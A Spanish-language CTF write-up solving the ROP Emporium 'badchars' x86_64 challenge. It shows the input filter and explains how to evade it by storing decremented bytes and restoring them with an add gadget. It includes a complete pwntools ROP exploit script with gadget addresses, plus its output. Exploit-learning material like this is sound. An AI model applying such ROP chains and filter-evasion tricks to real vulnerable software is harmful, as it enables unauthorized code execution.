Este ejercicio es el mismo que [write4](https://ub1cu0.gitbook.io/pwn-writeups/ropemporium/4.-write4-x86_64) con una pequeña diferencia.

En este ejercicio la función donde teníamos el buffer overflow hay un bucle que, si nuestro payload tiene ciertos  valores los cambiará a otro valor, lo cual romperá nuestro Rop:

```c
input = read(0, array, 0x200);

for (x = 0; x < input; x = x + 1) {
    for (y = 0; y < 4; y = y + 1) {
        if (array[x] == "xga.badchars by ROP Emporium"[y]) { // Pilla x, g, a y x como badchars
            array[x] = -0x15;
        }
    }
}
```

Recordemos que en nuestro solve pasamos `flag.txt` al .bss, con lo cual mandamos el `flag.txt` en el payload:

```python
    payload = flat({
        offset: [
            pop_r14_r15, exe.bss(), b'flag.txt', # Esto mete badchars
            mov_r14_r15,
            pop_rdi,    exe.bss(),
            exe.plt['print_file'],
        ]
    })
```

Para poder saltarnos esta barrera podemos pasar flag.txt a hexadecimal, restar un byte a cada letra que era un badchar y luego, justo antes de pasárselo como parámetro a la función, sumarle 1 byte con un gadget que tenga por ejemplo  `add` como  `add byte ptr [r15], r14b ; ret`

Con esto podemos pasar a la creación del exploit:

```python
#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("badchars")
libc = ELF("libbadchars.so")

context.binary = exe
context.terminal = ['kitty']
gdb_script = f'''
continue
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
        return r
    return remote("addr", 1337)

def main():
    io = conn()
    
    offset = 40
    pop_rdi = 0x004006a3 # pop rdi ; ret
    mov_r13_r12 = 0x00400634 # mov qword ptr [r13], r12 ; ret
    pop_r12_r13_r14_r15 = 0x0040069c # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
    add_byte = 0x0040062c # add byte ptr [r15], r14b ; ret
    
    payload = flat(
            b'B' * offset,
            pop_r12_r13_r14_r15, b"\x66\x6c\x60\x66\x2d\x74\x77\x74", exe.bss(), 0x69, 0x69,
            mov_r13_r12, 
            pop_r12_r13_r14_r15, 0x0, 0x0, 0x1, exe.bss() + 0x2,
            add_byte, 
            pop_r12_r13_r14_r15, 0x0, 0x0, 0x1, exe.bss() + 0x3,
            add_byte, 
            pop_r12_r13_r14_r15, 0x0, 0x0, 0x1, exe.bss() + 0x4,
            add_byte, 
            pop_r12_r13_r14_r15, 0x0, 0x0, 0x1, exe.bss() + 0x6,
            add_byte, 
            pop_rdi,    exe.bss(),
            exe.plt['print_file'],
    )
    
    bad = b"xga."
    found = False
    for i, bch in enumerate(payload):
        if bch in bad:
            print(f"[badchar] {chr(bch)!r} en payload[{i}]")
            found = True
    if not found:
        print("[badchar] ninguno")

    io.sendlineafter(b'> ', payload)
    
    io.interactive()

if __name__ == "__main__":
    main()

```

```python
[*] Switching to interactive mode
[DEBUG] Received 0x2c bytes:
    b'Thank you!\n'
    b'ROPE{a_placeholder_32byte_flag!}\n'
Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```

Funciona!
